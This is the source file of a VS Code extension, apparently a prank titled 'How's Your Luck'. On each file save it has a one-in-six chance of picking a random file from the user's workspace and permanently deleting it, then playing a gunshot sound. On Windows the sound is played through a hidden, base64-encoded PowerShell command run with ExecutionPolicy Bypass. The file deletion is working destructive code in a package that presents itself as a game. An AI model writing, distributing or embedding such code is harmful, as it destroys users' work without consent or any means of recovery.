import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';
import { spawn } from 'child_process';

export function activate(context: vscode.ExtensionContext) {

	console.log("How's Your Luck is active 😈");

	const soundPath = path.join(context.extensionPath, 'assets', 'fahhhhh.mp3');

	const disposable = vscode.workspace.onDidSaveTextDocument(async (document) => {

		const roll = Math.floor(Math.random() * 6) + 1;

		if (roll !== 1) {
			return;
		}

		const workspaceFolders = vscode.workspace.workspaceFolders;

		if (!workspaceFolders) {
			return;
		}

		const root = workspaceFolders[0].uri.fsPath;

		const files = getAllFiles(root).filter(
			file => file !== document.uri.fsPath
		);

		if (files.length === 0) {
			return;
		}

		const unluckyFile = files[Math.floor(Math.random() * files.length)];

		try {

			await fs.promises.rm(unluckyFile, { force: true });

			playGunshot(soundPath);

			vscode.window.showErrorMessage(
				`💀 BANG! Your luck ran out.`
			);

		} catch (err) {

			console.error(err);

		}

	});

	context.subscriptions.push(disposable);
}

function getAllFiles(dir: string): string[] {

	let results: string[] = [];

	const ignore = [
		'.vscode',
		'dist',
		'node_modules',
		'.git',
		'build',
		'.next',
		'out'
	];

	const list = fs.readdirSync(dir);

	list.forEach(file => {

		const filePath = path.join(dir, file);

		if (ignore.some(i => filePath.includes(i))) {
			return;
		}

		const stat = fs.statSync(filePath);

		if (stat && stat.isDirectory()) {

			results = results.concat(getAllFiles(filePath));

		} else {

			results.push(filePath);

		}

	});

	return results;
}

function playGunshot(filePath: string): void {
	const candidates: string[][] = [];

	switch (process.platform) {
		case 'win32':
			candidates.push(buildPowerShellCommand(filePath));
			break;
		case 'darwin':
			candidates.push(['afplay', filePath]);
			break;
		default:
			candidates.push(
				['ffplay', '-nodisp', '-autoexit', '-loglevel', 'quiet', filePath],
				['mpg123', '-q', filePath],
				['mpg321', '-q', filePath],
				['paplay', filePath],
				['aplay', filePath]
			);
			break;
	}

	runFirstAvailable(candidates);
}

function runFirstAvailable(candidates: string[][]): void {
	if (candidates.length === 0) {
		return;
	}

	const [args, ...rest] = candidates;
	const [command, ...commandArgs] = args;

	let child: ReturnType<typeof spawn> | undefined;

	try {
		child = spawn(command, commandArgs, { stdio: 'ignore' });
	} catch {
		runFirstAvailable(rest);
		return;
	}

	child.on('error', (err: NodeJS.ErrnoException) => {
		console.error("Erro ao tocar áudio:", err.message);
		runFirstAvailable(rest);
	});

	child.on('exit', (code, signal) => {
		if (signal === null && code !== 0) {
			runFirstAvailable(rest);
		}
	});

	child.on('spawn', () => {
		child?.unref();
	});
}

function buildPowerShellCommand(filePath: string): string[] {
	const escaped = filePath.replace(/'/g, "''");

	const script = [
		"$ErrorActionPreference='SilentlyContinue'",
		'Add-Type -AssemblyName presentationCore',
		'$mp=New-Object System.Windows.Media.MediaPlayer',
		`$mp.Open('${escaped}')`,
		'$mp.Play()',
		'$deadline=(Get-Date).AddSeconds(30)',
		'while((Get-Date) -lt $deadline){',
		'  $done=$false',
		'  if($mp.NaturalDuration.HasTimeSpan){ $done=$mp.Position -ge $mp.NaturalDuration.TimeSpan }',
		'  else { $done=(-not $mp.IsPlaying) -and ($mp.Position.TotalMilliseconds -gt 0) }',
		'  if($done){ break }',
		'  Start-Sleep -Milliseconds 100',
		'}',
		'$mp.Stop()',
		'$mp.Close()'
	].join('\n');

	const encoded = Buffer.from(script, 'utf16le').toString('base64');

	return [
		'powershell',
		'-NoProfile',
		'-NonInteractive',
		'-ExecutionPolicy',
		'Bypass',
		'-WindowStyle',
		'Hidden',
		'-EncodedCommand',
		encoded
	];
}

export function deactivate() { }